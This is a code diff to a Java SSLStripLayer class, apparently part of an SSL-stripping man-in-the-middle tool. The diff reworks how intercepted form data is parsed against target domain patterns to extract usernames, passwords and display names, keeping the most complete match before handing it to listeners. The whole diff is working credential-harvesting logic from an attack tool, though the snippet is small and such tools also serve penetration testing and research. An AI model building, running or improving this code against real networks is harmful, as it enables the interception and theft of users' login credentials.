@@ -88,15 +88,16 @@ public class SSLStripLayer {
 				        		(parts.length != 6 || !parts[4].equals("Data")))
 				        	continue;
 				        String domain = parts[parts.length-1].substring(1, parts[parts.length-1].length()-2);
+				        UserInfo bestMatch = new UserInfo(null, null, null, null);
+				        String data;
+						try {
+							data = in.readLine();
+						} catch (IOException e) { throw new RuntimeException(e); }
+			        	if (data == null)
+			        		continue;
 				        for (MatchTarget target : matchTargets) {
 				        	if (!domain.matches(target.domainRegex))
 				        		continue;
-				        	String data;
-							try {
-								data = in.readLine();
-							} catch (IOException e) { throw new RuntimeException(e); }
-				        	if (data == null)
-				        		break;
 				        	String[] variables = data.split("&");
 				        	boolean matchedVar = target.varMatchKey == null;
 				        	String displayName = null, userName = null, password = null;
@@ -132,13 +133,33 @@ public class SSLStripLayer {
 				        	}
 				        	if (matchedVar) {
 				        		UserInfo newUser = new UserInfo(domain, userName, password, displayName);
-				        		synchronized(userInfoListeners) {
-				        			for (UserInfoListener listener: userInfoListeners)
-				        				listener.receiveNewUserInfo(newUser);
-				        		}
-				        		break;
+				        		int newUserNonNullCount = 1;
+				        		if (userName != null)
+				        			newUserNonNullCount++;
+				        		if (password != null)
+				        			newUserNonNullCount++;
+				        		if (displayName != null)
+				        			newUserNonNullCount++;
+				        		int bestUserNonNullCount = 0;
+				        		if (bestMatch.domain != null)
+				        			bestUserNonNullCount++;
+				        		if (bestMatch.userName != null)
+				        			bestUserNonNullCount++;
+				        		if (bestMatch.password != null)
+				        			bestUserNonNullCount++;
+				        		if (bestMatch.displayName != null)
+				        			bestUserNonNullCount++;
+				        		if (newUserNonNullCount > bestUserNonNullCount)
+				        			bestMatch = newUser;
+				        		
 				        	}
 				        }
+		        		if (bestMatch.domain != null) {
+							synchronized (userInfoListeners) {
+								for (UserInfoListener listener : userInfoListeners)
+									listener.receiveNewUserInfo(bestMatch);
+							}
+						}
 				    }
 				}
 			}
